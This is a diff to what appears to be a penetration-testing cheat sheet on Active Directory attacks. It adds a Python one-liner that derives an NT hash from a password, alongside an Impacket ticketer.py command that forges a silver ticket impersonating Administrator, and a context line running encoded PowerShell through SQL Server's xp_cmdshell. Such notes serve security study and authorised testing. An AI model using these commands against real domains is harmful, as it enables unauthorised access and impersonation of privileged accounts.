@@ -152,6 +152,14 @@ exec xp_cmdshell 'powershell -enc <encoded_raw_code>'
 - Grants access to only that specific service
 - Like having a key to one room, not the whole building
 
+### Generate Nthash
+```bash
+└─# python3                
+Python 3.13.11 (main, Dec  8 2025, 11:43:54) [GCC 15.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import hashlib
+>>> hashlib.new('md4', 'password_here'.encode('utf-16le')).digest().hex()
+```
 ```bash
 ticketer.py -nthash $nthash -domain-sid $sid -domain $Domain -spn $user/$Full_DOmain:$Port -groups 1105 -user-id 500 Administrator
 ```
